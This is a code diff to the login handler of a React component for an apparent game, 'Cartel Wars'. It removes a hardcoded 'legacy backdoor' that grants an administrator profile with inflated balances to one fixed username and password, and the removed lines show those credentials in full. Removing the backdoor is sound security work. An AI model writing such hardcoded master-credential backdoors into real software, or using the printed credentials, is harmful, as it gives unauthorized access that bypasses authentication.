@@ -254,32 +254,7 @@ const Auth: React.FC<Props> = ({ lang, globalUsers, onComplete }) => {
     e.preventDefault();
     setError('');
 
-    // ADMINISTRATOR MASTER ACCESS CHECK (Legacy backdoor)
-    if (isLogin && formData.email === 'carteladminwars' && formData.password === 'admin8672652') {
-      setIsLoading(true);
-      setTimeout(() => {
-        onComplete({
-          id: '000-ADMIN',
-          email: 'admin@cartelwars.com',
-          name: 'ADMINISTRADOR',
-          nameChanged: true,
-          rank: Rank.JEFE,
-          balance: 999.99,
-          cwarsBalance: 1000000,
-          tonWithdrawn: 0,
-          tickets: 100,
-          referrals: 0,
-          lastRaceDate: null,
-          ownedWeapons: [],
-          lastTicketDate: new Date(),
-          language: lang,
-          status: 1000,
-          inventory: {},
-        } as UserProfile);
-        setIsLoading(false);
-      }, 1000);
-      return;
-    }
+
 
     if (!formData.email || !formData.password || (!isLogin && !formData.alias)) {
       setError(t.errEmpty);
